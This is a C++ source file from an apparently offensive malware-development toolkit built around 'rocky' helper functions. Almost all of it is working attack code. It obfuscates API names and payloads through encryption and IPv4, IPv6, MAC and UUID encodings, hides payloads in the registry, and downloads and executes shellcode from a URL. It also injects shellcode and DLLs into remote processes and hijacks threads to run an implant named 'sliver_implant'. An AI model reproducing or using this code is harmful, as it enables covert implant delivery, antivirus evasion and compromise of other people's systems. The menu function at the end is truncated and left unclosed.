#include "includes.h"
#include "structures.h"
#include "functions.h"
#include "payloads.h"
#include "obfuscator.h"
#include "encryption.h"
#include "registry.h"
#include <string>    // For std::string and std::wstring
#include <codecvt>   // For string-to-wstring conversion
#include <locale>
using namespace std;


/* EXAMPLE:  of getting a handle on a module using custom GetModuleHandle*/
void get_a_handle_on_module_example() {
	int str_ntdll_offsets_[] = { 39, 45, 29, 37, 37, 52, 29, 37, 37 };
	std::string deob_ntdll = rockyGetString(str_ntdll_offsets_, big_string, sizeof(str_ntdll_offsets_)).c_str();
	std::wstring deobfuscated_ntdll = stringToWstring(deob_ntdll);
	HMODULE rockyHandle = rockyGetModuleHandle(deobfuscated_ntdll.c_str());
	HMODULE rockyHandle2 = rockyGetModuleHandle2(deobfuscated_ntdll.c_str());
	//rockyPrintColor(green, "Search for given DLL name and return its handle");
	rockyPrintColor(green, "[*] rockyGetModuleHandle: working __address__: 0x%p", rockyHandle);
	//rockyPrintColor(green, "DLL enumeration using the head and the linked list's elements");
	rockyPrintColor(green, "[*] rockyGetModuleHandle2: working __address__: 0x%p", rockyHandle2);
}

/* Wait before executing next function */
void next_function() {
	rockyPrintColor(red, "[#]:[LOAD]");
	(void)getchar();
}

/* EXAMPLE:  rockyallocate bytes to memory */
void allocate_memory_bytes_example() {
	/* [ PAYLOAD EXAMPLE OF .DATA] */
	/* .DATA SECTION PAYLOAD::: NOTE: Payloads that are assigned like this are saved in the .data section of the PE Executable */
	unsigned char payload[] = { 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00 };
	size_t payload_size = sizeof(payload);
	void* pointer_to_payload = NULL;
	NTSTATUS status = rockyAlloc(payload, payload_size, &pointer_to_payload);
	if (status == STATUS_SUCCESS && pointer_to_payload != NULL) {
		rockyPrintColor(green, "[*] rockyAlloc: able to allocate bytes ");
		rockyPrintAllocated(pointer_to_payload, payload_size);
		rockyDealloc(pointer_to_payload);
	}
	else {
		rockyPrintColor(red, "Failed to allocate raw payload");
	}
}

/* EXAMPLE:  rockyAllocate string */
void allocate_memory_string_example() {
	const char* MyString = "Hello World";
	void* pointer_to_string_address = NULL;
	NTSTATUS status = rockyAlloc(MyString, &pointer_to_string_address);
	if (status == STATUS_SUCCESS && pointer_to_string_address != NULL) {
		rockyPrintAllocated(pointer_to_string_address, strlen(MyString) + 1); // NULL Terminator
		rockyPrintColor(green, "[*] rockyAlloc: able to allocate strings");
		rockyDealloc(pointer_to_string_address);
	}
	else {
		rockyPrintColor(red, "Failed to allocate string to memory");
	}
}

/* EXAMPLE: Loadlibrary custom function*/
void load_a_dll_example() {
	HMODULE hModule = (HMODULE)rockyLoadLibrary(L"user32.dll");
	if (hModule) {
		rockyPrintColor(green, "[*] rockyLoadLibrary: working ");
	}
	else {
		rockyPrintColor(red, "Failed to load DLL");
	}

}


/* EXAMPLE: example of using obfuscation */
void obfuscator() {
	/* Obfuscate a string */
	//char obfuscated_string_test[] = "Hello World";
	//char ntdll_string[] = "NTDLL.DLL";
	//rockyObfuscation(big_string, ntdll_string);
	/* Need to be obfuscated*/
	char str_LdrGetProcedureAddress[] = "LdrGetProcedureAddress";
	char str_LdrLoadDll[] = "LdrLoadDll";
	char str_NtAllocateVirtualMemory[] = "NtAllocateVirtualMemory";
	char str_NtFreeVirtualMemory[] = "NtFreeVirtualMemory";
	char str_GetProcAddress[] = "GetProcAddress";
	char str_NtProtectVirtualMemory[] = "NtProtectVirtualMemory";
	char str_NtCreateThreadEx[] = "NtCreateThreadEx";
	char str_NtWriteProcessMemory[] = "NtWriteProcessMemory";
	/* Obfuscate string here*/
	rockyObfuscation(big_string, str_NtWriteProcessMemory);
	/* Retrive obfuscated string */
	rockyPrintColor(green, "[*] obfuscation: working");
}


DWORD WINAPI Example_Thread_Function(LPVOID lpParam) {
	rockyPrintColor(green, "[!] This is a thread");
	return 0;
}

void executeShellcode(const PBYTE shellcode, SIZE_T shellcodeSize) {
	try {
		// Step 1: Allocate memory for the shellcode in the current process
		void* allocatedMemory = NULL;
		NTSTATUS status = rockyAlloc(shellcode, shellcodeSize, &allocatedMemory);
		if (status != STATUS_SUCCESS || allocatedMemory == NULL) {
			rockyPrintColor(red, "Failed to allocate memory. NTSTATUS: %d", status);
			return;
		}
		rockyPrintColor(green, "[*] rockyAlloc: Shellcode written to memory");

		// Step 2: Change the memory protection to make it executable
		ULONG oldProtect;
		status = rockyVirtualProtect(GetCurrentProcess(), allocatedMemory, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
		if (status != STATUS_SUCCESS) {
			rockyPrintColor(red, "Failed to change memory protection. NTSTATUS: %d", status);
			rockyDealloc(allocatedMemory);
			return;
		}

		// Step 3: Create a thread to execute the shellcode
		HANDLE hThread = NULL;
		status = rockyCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),
			(LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, 0, 0, 0, NULL);

		if (status == STATUS_SUCCESS) {
			rockyPrintColor(green, "Shellcode is running in a separate thread.");
			CloseHandle(hThread);
		}
		else {
			rockyPrintColor(red, "Failed to create a thread to run the shellcode. NTSTATUS: %d", status);
			rockyDealloc(allocatedMemory);
		}
	}
	catch (const std::exception& ex) {
		std::cerr << "Exception occurred: " << ex.what() << std::endl;
	}
	catch (...) {
		std::cerr << "Unknown exception occurred" << std::endl;
	}
}

void executeShellcode(const unsigned char* shellcode, size_t shellcodeSize) {
	try {
		void* allocatedMemory = NULL;
		NTSTATUS status = rockyAlloc(shellcode, shellcodeSize, &allocatedMemory);
		if (status != STATUS_SUCCESS || allocatedMemory == NULL) {
			rockyPrintColor(red, "Failed to allocate memory", status);
			return;
		}
		rockyPrintColor(red, "[*] rockyAlloc: written to memory");
		ULONG oldProtect;

		/* Only using current process here */
		status = rockyVirtualProtect(GetCurrentProcess(), allocatedMemory, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
		if (status != STATUS_SUCCESS) {
			std::cerr << "Failed to change memory protection. NTSTATUS: " << status << std::endl;
			rockyDealloc(allocatedMemory);
			return;
		}
		/* basic thread , current process with allocated memory */
		HANDLE hThread = NULL;
		status = rockyCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),
			(LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, 0, 0, 0, NULL);
		if (status == STATUS_SUCCESS) {
			rockyPrintColor(green, "Shellcode is running in a separate thread.");
			CloseHandle(hThread);
		}
		else {
			rockyPrintColor(red, "Failed, no thread today ");
			rockyDealloc(allocatedMemory);
			return;
		}

	}
	catch (const std::exception& ex) {
		std::cerr << "exception occurred: " << ex.what() << std::endl;
	}
	catch (...) {
		std::cerr << "unknown exception occurred" << std::endl;
	}
}


/* EXAMPLE: Function to Decrypt from AES , able to additionally execute the payload after decryption with execute = true, otherwise just prints out the Decrypted Data */
void decrypt_aes_test(const unsigned char* pCipherText, DWORD cipherTextSize,const unsigned char* pKey, const unsigned char* pIv,bool execute = false)
{
	PVOID pPlaintext = NULL;
	DWORD dwPlainSize = 0;
	// Cast const unsigned char* to PBYTE
	if (!rockyAes_decrypt(
		const_cast<PBYTE>(pCipherText), cipherTextSize,
		const_cast<PBYTE>(pKey), const_cast<PBYTE>(pIv),
		&pPlaintext, &dwPlainSize)) {
		printf("Decryption failed\n");
		return;
	}
	// Validate decryption output
	if (pPlaintext == NULL || dwPlainSize == 0) {
		printf("Decryption returned invalid data\n");
		return;
	}
	// Conditionally execute the decrypted shellcode or print hex data
	if (execute) {
		printf("Executing shellcode...\n");
		executeShellcode((const unsigned char*)pPlaintext, dwPlainSize);
	}
	else {
		printf("Printing hex data...\n");
		PrintHexData("DecryptedData", (PBYTE)pPlaintext, dwPlainSize);
	}
	if (pPlaintext) {
		// Free the memory allocated by InstallAesDecryption
		HeapFree(GetProcessHeap(), 0, pPlaintext);
	}
}


/* EXAMPLE: Function to Encrypt to AES, prints out the data in a encrypted format that can be used elsewhere */
void encrypt_aes_test(const unsigned char* data, size_t dataSize) {
	BYTE pKey[KEYSIZE];
	BYTE pIv[IVSIZE];
	/* seed for generating the key, the key bytes, and for generating the IB*/
	srand(static_cast<unsigned int>(time(NULL)));
	GenerateRandomBytes(pKey, KEYSIZE);
	srand(static_cast<unsigned int>(time(NULL) ^ pKey[0]));
	GenerateRandomBytes(pIv, IVSIZE);
	PrintHexData("pKey", pKey, KEYSIZE);
	PrintHexData("pIv", pIv, IVSIZE);
	PVOID pCipherText = NULL;
	DWORD dwCipherSize = 0;
	// Print the data to be encrypted
	PrintHexData("Data", const_cast<PBYTE>(data), static_cast<DWORD>(dataSize));
	// Encryption test
	if (!rockyAes_encrypt(
		const_cast<PBYTE>(data),
		static_cast<DWORD>(dataSize),
		pKey, pIv, &pCipherText, &dwCipherSize)) {
		rockyPrintColor(red, "Error encrypting AES");
		return;
	}
	PrintHexData("CipherText", static_cast<PBYTE>(pCipherText), dwCipherSize);
	if (pCipherText) {
		HeapFree(GetProcessHeap(), 0, pCipherText);
	}
	system("PAUSE");
}


/* EXAMPLE: creating a basic thread that prints working !! */
void create_thread_example() {
	HANDLE hThread = NULL;
	NTSTATUS status = rockyCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)Example_Thread_Function, NULL, 0, 0, 0, 0, NULL);
	if (status == STATUS_SUCCESS) {
		rockyPrintColor(green, "[*] rockyCreateThreadEx: Working");
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}
	else {
		rockyPrintColor(red, "[*] rockyCreateThreadEx: Not working ");
	}
}



int generate_ipv4_payload() {
	if (!GenerateIpv4Output(reverse_shell_test, sizeof(reverse_shell_test))) {
		// if failed, that is sizeof(rawData) isn't a multiple of 4 
		rockyPrintColor(red, "Payload is not a multiple of 4 for Ipv4 generation");
		return -1;
	}
	rockyPrintColor(green, "Press Enter to exit ... ");
	printf("[#] Press <Enter> To Quit ... ");
	(void)getchar();
	return 0;
}



void generate_ipv6_payload() {

	if (!GenerateIpv6Output(sliver_implant, sizeof(sliver_implant))) {
		// if failed, that is sizeof(rawData) isnt multiple of 16
		rockyPrintColor(red, "Payload is not a multiple of 16 for Ipv6 generation");
	}

	printf("[#] Press <Enter> To Quit ... ");
	(void)getchar();
}



void ipv4_deobfuscate_example() {

	PBYTE	pDAddress = NULL;
	SIZE_T	sDSize = NULL;

	if (!Ipv4Deobfuscation((char**)Ipv4Array, NumberOfElementsIpv4, &pDAddress, &sDSize)) {
		rockyPrintColor(green, "Deobfuscated bytes at 0x%p of size %ld ::", pDAddress, sDSize);

	}
	//printf("[+] Deobfuscated Bytes at 0x%p of Size %ld ::: \n", pDAddress, sDSize);
	for (size_t i = 0; i < sDSize; i++) {
		if (i % 16 == 0)
			printf("\n\t");

		printf("%0.2X ", pDAddress[i]);
	}

	HeapFree(GetProcessHeap(), 0, pDAddress);


	printf("\n\n[#] Press <Enter> To Quit ... ");
	(void)getchar();

}


// Data and key
// Removed
//






int rc4_example1() {
	Rc4Context ctx = { 0 };

	// Initialize and encrypt
	rc4Init(&ctx, key, sizeof(key));
	unsigned char* Ciphertext = (unsigned char*)malloc(sizeof(shellcode));
	if (Ciphertext == NULL) {
		printf("Error: Memory allocation failed\n");
		return 1;
	}
	memset(Ciphertext, 0, sizeof(shellcode));
	rc4Cipher(&ctx, shellcode, Ciphertext, sizeof(shellcode) - 1);
	printf("[i] Ciphertext : 0x%p \n", Ciphertext);

	// Re-initialize for decryption
	rc4Init(&ctx, key, sizeof(key));
	unsigned char* PlainText = (unsigned char*)malloc(sizeof(shellcode));
	if (PlainText == NULL) {
		printf("Error: Memory allocation failed\n");
		free(Ciphertext);
		return 1;
	}
	memset(PlainText, 0, sizeof(shellcode));
	rc4Cipher(&ctx, Ciphertext, PlainText, sizeof(shellcode) - 1);

	// Output result
	printf("[i] PlainText : \"%s\" \n", (char*)PlainText);

	// Clean up
	free(Ciphertext);
	free(PlainText);
	return 0;
}


int rc4_example2() {

	// Print the address of the shellcode
	printf("[i] shellcode: 0x%p \n", shellcode);

	// Encryption
	if (!Rc4EncryptionViSystemFunc032(key, shellcode, sizeof(key), sizeof(shellcode))) {
		return -1;
	}

	printf("[#] Press <Enter> To Decrypt ...");
	getchar();

	// Decryption
	if (!Rc4EncryptionViSystemFunc032(key, shellcode, sizeof(key), sizeof(shellcode))) {
		return -1;
	}

	// Print shellcode to verify successful decryption
	printf("[i] shellcode: \"%s\" \n", (char*)shellcode);

	printf("[#] Press <Enter> To Quit ...");
	getchar();
	return 0;
}



int rc4_example3() {

	// Print the address of the shellcode
	printf("[i] shellcode: 0x%p \n", shellcode);

	// Encryption
	if (!Rc4EncryptionViSystemFunc033(key, shellcode, sizeof(key), sizeof(shellcode))) {
		return -1;
	}

	printf("[#] Press <Enter> To Decrypt ...");
	getchar();

	// Decryption
	if (!Rc4EncryptionViSystemFunc033(key, shellcode, sizeof(key), sizeof(shellcode))) {
		return -1;
	}

	// Print shellcode to verify successful decryption
	printf("[i] shellcode: \"%s\" \n", (char*)shellcode);

	printf("[#] Press <Enter> To Quit ...");
	getchar();
	return 0;
}


int xor_using_input_key_example() {
	// Printing some data
	printf("[i] shellcode : 0x%p \n", shellcode);

	// Encryption
	XorByInputKey(shellcode, sizeof(shellcode), key, sizeof(key));

	printf("[#] Press <Enter> To Decrypt ...");
	getchar();

	// Decryption
	XorByInputKey(shellcode, sizeof(shellcode), key, sizeof(key));

	// Printing the shellcode's string
	printf("[i] shellcode : \"%s\" \n", (char*)shellcode);


	// Exit
	printf("[#] Press <Enter> To Quit ...");
	getchar();
	return 0;

}


int xor_using_i_keys_example() {
	// Printing some data
	printf("[i] shellcode : 0x%p \n", shellcode);

	// Encryption, 0xF4 is the key
	XorByiKeys(shellcode, sizeof(shellcode), 0xF4);

	printf("[#] Press <Enter> To Decrypt ...");
	getchar();

	// Decryption, 0xF4 is the key
	XorByiKeys(shellcode, sizeof(shellcode), 0xF4);

	// Printing the shellcode's string
	printf("[i] shellcode : \"%s\" \n", (char*)shellcode);


	// Exit
	printf("[#] Press <Enter> To Quit ...");
	getchar();
	return 0;

}


// Uncomment one of the following to test WRITEMODE or READMODE
#define WRITEMODE

//#define READMODE

int registry_write_example() {
	printf("[#] Writing test payload to registry...\n");
	if (!registry_write(sliver_implant, sizeof(sliver_implant))) {
		printf("[!] Writing payload failed.\n");
		return -1;
	}
	printf("[+] Payload written successfully.\n");
	return 0;
}

int registry_read_example() {
	printf("[#] Reading payload from registry...\n");
	PBYTE pPayload = NULL;
	SIZE_T payloadSize = 0;

	if (!registry_read(&pPayload, &payloadSize)) {
		printf("[!] Reading payload failed.\n");
		return -1;
	}

	printf("[+] Payload read (size: %ld): ", payloadSize);
	for (SIZE_T i = 0; i < payloadSize; i++) {
		printf("%02X ", pPayload[i]);
	}
	printf("\n");

	HeapFree(GetProcessHeap(), 0, pPayload);
	return 0;
}

int registry_execute_payload_example() {
	printf("[#] Executing payload from the registry...\n");

	// Read the payload from the registry
	PBYTE pPayload = NULL;
	SIZE_T payloadSize = 0;

	if (!registry_read(&pPayload, &payloadSize)) {
		printf("[!] Reading payload failed.\n");
		return -1;
	}

	// Execute the payload
	if (!RunShellcode(pPayload, payloadSize)) {
		printf("[!] Failed to execute payload.\n");
		HeapFree(GetProcessHeap(), 0, pPayload);
		return -1;
	}

	// Free the memory used for the payload
	HeapFree(GetProcessHeap(), 0, pPayload);
	return 0;
}



void ipv6_deobfuscate_example() {
	rockyPrintColor(green, "Ipv6 Deobf");
	PBYTE	pDAddress = NULL;
	SIZE_T	sDSize = NULL;

	if (!Ipv6Deobfuscation((char**)sliver_implant_ipv6, NumberOfElementsSliver, &pDAddress, &sDSize)) {
		rockyPrintColor(green, "Deobfuscated Bytes at 0x%p of size %ld :::", pDAddress, sDSize);

	}
	for (size_t i = 0; i < sDSize; i++) {
		if (i % 16 == 0)
			printf("\n\t");

		printf("%0.2X ", pDAddress[i]);
	}

	HeapFree(GetProcessHeap(), 0, pDAddress);


	printf("\n\n[#] Press <Enter> To Quit ... ");
	(void)getchar();

}

int local_payload_injection_with_uuid() {
	// WILL NEVER WORK IN DEBUG MODE, ONLY FINAL BUILD?
	rockyPrintColor(green, "Local Payload Execution");

	PBYTE pDeobfuscatedPayload = NULL;
	SIZE_T sDeobfuscatedSize = 0;
	int temp;
	rockyPrintColor(green, "Injecting Shellcode into the local process of Pid: %d", GetCurrentProcessId());
	rockyPrintColor(green, "[#] Press <Enter> To Decrypt ... ");
	temp = getchar();
	rockyPrintColor(yellow, "[i] Decrypting ...");

	// Deobfuscate
	if (!rockyUUID_Deobfuscator((char**)UuidArray, NumberOfElementsUUID, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
		rockyPrintColor(red, "[!] Deobfuscation failed.");
		return -1;
	}

	if (pDeobfuscatedPayload == NULL || sDeobfuscatedSize == 0) {
		rockyPrintColor(red, "[!] Invalid deobfuscated payload. Exiting...");
		return -1;
	}

	rockyPrintColor(green, "[i] Deobfuscated Payload At : 0x%p Of Size : %zu", pDeobfuscatedPayload, sDeobfuscatedSize);

	rockyPrintColor(green, "[#] Press <Enter> To Allocate ... ");
	temp = getchar();

	PVOID pShellcodeAddress = NULL;
	NTSTATUS status = rockyAlloc(pDeobfuscatedPayload, sDeobfuscatedSize, &pShellcodeAddress);

	if (status != STATUS_SUCCESS) {

		rockyPrintColor(red, "[!] rockyAlloc Failed With Error : %d", status);

		return -1;

	}

	rockyPrintColor(green,"[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	rockyPrintColor(green,"[#] Press <Enter> To Write Payload ... ");
	temp = getchar();

	memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);

	memset(pDeobfuscatedPayload, 0, sDeobfuscatedSize);

	DWORD dwOldProtection = 0;
	status = rockyVirtualProtect(GetCurrentProcess(), pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READ, &dwOldProtection);
	if (status != STATUS_SUCCESS) {
		rockyPrintColor(red, "[!] rockyVirtualProtect Failed With Error : %d", status);
		return -1;
	}

	rockyPrintColor(green,"[#] Press <Enter> To Run ... ");
	(void)getchar();

	HANDLE hThread = NULL;
	status = rockyCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, 0, 0, 0, NULL);
	if (status != STATUS_SUCCESS) {
		rockyPrintColor(red, "[!] rockyCreateThreadEx Failed With Error : %d \n", status);
		return -1;
	}
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
	printf("[#] Press <Enter> To Quit ... ");
	(void)getchar();

	return 0;
}


int remote_shellcode_injector() {
	HANDLE hProcess = NULL;
	DWORD dwProcessID = NULL;
	PBYTE pDeobfuscatedPayload = NULL;
	SIZE_T sDeobfuscatedSize = NULL;
	wchar_t processName[MAX_PATH];
	wprintf(L"Enter Process Name (e.g , notepad) ");
	fgetws(processName, MAX_PATH, stdin);
	processName[wcslen(processName) - 1] = L'\0';
	if (!rockyGetRemoteProcessHandle(processName, &dwProcessID, &hProcess)) {
		rockyPrintColor(red, "Process Not found !"); return -1;
	}
	rockyPrintColor(green, "Finished");
	rockyPrintColor(green, "Found Target process ID: %d", dwProcessID);

	// PAYLOAD GOES HERE
	rockyPrintColor(green, "Press enter to deobfuscate Ipv6 payload");
	(void)getchar();
	if (!Ipv6Deobfuscation((char**)sliver_implant_ipv6, NumberOfElementsSliver, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
		rockyPrintColor(red, "Failed to Deobfuscate payload");
	}
	rockyPrintColor(green, "[i] Deobfuscated Payload At : 0x%p Of Size : %d ::: ", pDeobfuscatedPayload, sDeobfuscatedSize);

	if (!rockyInjectShellcode(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize)) {
		rockyPrintColor(red, "Failed to Inject shellcode into remote process");
	}
	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
	CloseHandle(hProcess);
	printf("[#] Press <Enter> To Quit ... ");
	(void)getchar();
	//if (!Ipv6Deobfuscation())
}


/*Process Injection - DLL Injection into remote process*/
void remote_dll_injector() {
	rockyPrintColor(green, "Remote DLL Injector");
	HANDLE hProcess = NULL;
	DWORD dwProcessId = NULL;
	wchar_t dllPath[MAX_PATH];
	wchar_t processName[MAX_PATH];

	/*Prompts*/
	wprintf(L"[i] Enter Complete DLL Payload Path (e.g., C:\\Users\\user\\Documents\\pebbleDLL.dll): ");
	fgetws(dllPath, MAX_PATH, stdin);
	dllPath[wcslen(dllPath) - 1] = L'\0';

	wprintf(L"[i] Enter Process Name (e.g., notepad.exe): ");
	fgetws(processName, MAX_PATH, stdin);
	// silly new line characters
	processName[wcslen(processName) - 1] = L'\0';

	wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", processName);
	if (!rockyGetRemoteProcessHandle(processName, &dwProcessId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return;
	}
	wprintf(L"[+] DONE \n");

	printf("[i] Found Target Process Pid: %d \n", dwProcessId);

	if (!rockyInjectDLL(hProcess, dllPath)) {
		return;
	}

	CloseHandle(hProcess);
	printf("[#] Press <Enter> To Quit ... ");
	(void)getchar();
}


#define PAYLOAD	L"http://adomain.localhost:443/QUIET_WEATHER"
int get_payload(PBYTE* payload, SIZE_T* payloadSize) {
	// Initialize size and payload to null
	*payloadSize = 0;
	*payload = NULL;

	// Reading the payload from URL or other source
	if (!GetPayloadFromUrl(PAYLOAD, payload, payloadSize)) {
		return -1;  // Error occurred while getting the payload
	}

	rockyPrintColor(green, "Bytes: 0x%p", *payload);
	rockyPrintColor(green, "Size: %ld", *payloadSize);

	// Printing the payload bytes in a formatted manner
	for (int i = 0; i < *payloadSize; i++) {
		if (i % 16 == 0)
			printf("\n\t");

		printf("%0.2X ", (*payload)[i]);
	}
	printf("\n\n");

	// The payload and its size are returned through the function parameters
	return 0;
}


int get_payload() {

	SIZE_T	Size = NULL;
	PBYTE	Bytes = NULL;

	// Reading the payload 
	if (!GetPayloadFromUrl(PAYLOAD, &Bytes, &Size)) {
		return -1;
	}

	printf("[i] Bytes : 0x%p \n", Bytes);
	printf("[i] Size  : %ld \n", Size);

	// Printing it
	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0)
			printf("\n\t");

		printf("%0.2X ", Bytes[i]);
	}
	printf("\n\n");

	// Freeing
	LocalFree(Bytes);
	printf("[#] Press <Enter> To Quit ... ");
	(void)getchar();

	return 0;
}

int generate_mac_address_payloads_example() {
	unsigned char* adjusted_implant = sliver_implant;
	size_t adjusted_size = sliver_implant_size;
	ensureMultipleOfSix(adjusted_implant, adjusted_size);
	if (!GenerateMacOutput(adjusted_implant, adjusted_size)) {
		//clean up if dynamically allocated
		delete[] adjusted_implant;
		// if failed, that is sizeof(rawData) isn't a multiple of 6
		return -1;
	}
	delete[] adjusted_implant;
	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	return 0;
}


int deob_mac_address_payload_example() {
	PBYTE pDAddress = NULL;
	SIZE_T sDSize = NULL;

	if (!MacDeobfuscation(sliver_mac_addresses, sizeof(sliver_mac_addresses) / sizeof(sliver_mac_addresses[0]), &pDAddress, &sDSize))
		return -1;

	printf("[+] Deobfuscated Bytes at 0x%p of Size %ld ::: \n", pDAddress, sDSize);
	for (size_t i = 0; i < sDSize; i++) {
		if (i % 16 == 0)
			printf("\n\t");
		printf("%0.2X ", pDAddress[i]);
	}

	HeapFree(GetProcessHeap(), 0, pDAddress);

	printf("\n\n[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}




void download_and_execute_payload() {
		PBYTE shellcode = NULL;
		SIZE_T shellcodeSize = 0;

		// Step 1: Get the payload
		if (get_payload(&shellcode, &shellcodeSize) != 0) {
			rockyPrintColor(red, "Failed to get payload.");
		}

		// Step 2: Execute the payload if successfully retrieved
		executeShellcode(shellcode, shellcodeSize);

		rockyPrintColor(green, "Press <Enter> to stop execution");
		(void)getchar();
		// Step 3: Free the payload memory (since LocalFree is used in get_payload)
		LocalFree(shellcode);

}




// Defining target process to enumerate by its name
#define TARGET_PROCESS L"svchost.exe"

int EnumProcesses_example1_basic() {
	DWORD		Pid = NULL;
	HANDLE		hProcess = NULL;

	if (!GetRemoteProcessHandle(TARGET_PROCESS, &Pid, &hProcess)) {
		return -1;
	}

	wprintf(L"[+] FOUND \"%s\" - Of Pid : %d \n", TARGET_PROCESS, Pid);

	//PrintProcesses();

	printf("[#] Press <Enter> To Quit ... ");
	(void)getchar();

	return 0;
}
#define TARGET_PROCESS L"Notepad.exe"

int EnumProcess_using_NtQuerySystemInformation_example() {
	DWORD		Pid = NULL;
	HANDLE		hProcess = NULL;

	if (!GetRemoteProcessHandleUsingNtQuerySystem(TARGET_PROCESS, &Pid, &hProcess)) {
		wprintf(L"[!] Cound Not Get %s's Process Id \n", TARGET_PROCESS);
		return -1;
	}

	wprintf(L"[+] FOUND \"%s\" - Of Pid : %d \n", TARGET_PROCESS, Pid);

	CloseHandle(hProcess);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}



int thread_hijacking_local_thread_creation_example() {
	HANDLE hThread = NULL;
	DWORD dwThreadId = NULL;

	// Creating sacrifical thread in suspended state 
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, &dwThreadId);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed with Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Hijacking Thread Of Id : %d ... ", dwThreadId);
	//hijacking the sacrifical thread created 
	if (!RunViaClassicThreadHijacking(hThread, sliver_implant, sliver_implant_size)) {
		return -1;
	}
	printf("[+] DONE \n");
	printf("[#] Press <Enter> to Run The Payload ... ");
	(void)getchar();


	// resuming suspended thread, so that it runs our shellcode 
	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	(void)getchar();
	return 0;
}

#define TARGET_PROCESS "Notepad.exe"


int remote_thread_hijacking_example() {
	HANDLE hProcess = NULL, hThread = NULL;
	DWORD dwProcessId = NULL;
	PVOID pAddress = NULL;

	// creating target remote process (in suspended state) 

	printf("[i] Creating \"%s\" Process ... ", TARGET_PROCESS);
	if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		return -1;

	}
	printf("\t[i] Target Process Created With Pid : %d \n", dwProcessId);
	printf("[+] DONE \n\n");

	// injecting the payload and getting the base address of it 

	printf("[i] Writing Shellcode to the target process ... ");
	if (!InjectShellcodeToRemoteProcess(hProcess, sliver_implant, sliver_implant_size, &pAddress)) {
		return -1;

	}
	printf("[+] DONE \n\n");


	// performing thread hijacking to run the payload 

	printf("[I] Hijacking the target thread to run our shellcode ... ");

	if (!HijackThread(hThread, pAddress)) {
		return -1;

	}
	printf("[+] DONE \n\n");

	printf("[#] Press <ENTER> to Quit ... ");
	(void)getchar();
	return 0;
}




int hijack_local_thread_without_thread_creation() {
	HANDLE hThread = NULL;
	DWORD dwMainThreadId = NULL, dwThreadId = NULL;
	PVOID pAddress = NULL;

	// getting the main thread id, since we are calling from our main thread, and not from a worker thread 
	// ' GetCurrentThreadId' will return the main thread ID
	dwMainThreadId = GetCurrentThreadId();

	printf("[I] Searching for a thread under the local process ... \n");
	if (!GetLocalThreadHandle(dwMainThreadId, &dwThreadId, &hThread)) {
		printf("[!] No Thread is found \n");
		return -1;

	}
	printf("\t[i] Found Target Thread of Id: %d \n", dwThreadId);
	printf("[+] DONE \n\n");


	printf("[i] Writing Shellcode to local process ...\n");
	if (!InjectShellcodeToLocalProcess(sliver_implant, sliver_implant_size, &pAddress)) {
		return -1;

	}
	printf("[+] DONE \n\n");


	printf("[i] Hijacking the target thread to run our shellcode ... \n");
	if (!HijackThreadAlt(hThread, pAddress)) {
		return -1;
	}
	printf("[+] DONE \n\n");

	printf("[#] Press <Enter to Quit ....");
	(void)getchar();



}
void show_example_menu() {
	int choice;
	wchar_t buffer[10];

	while (true) {
			rockyPrintColor(red, "Disarmed");
}



int main() {
	show_example_menu();
	return 0;
}
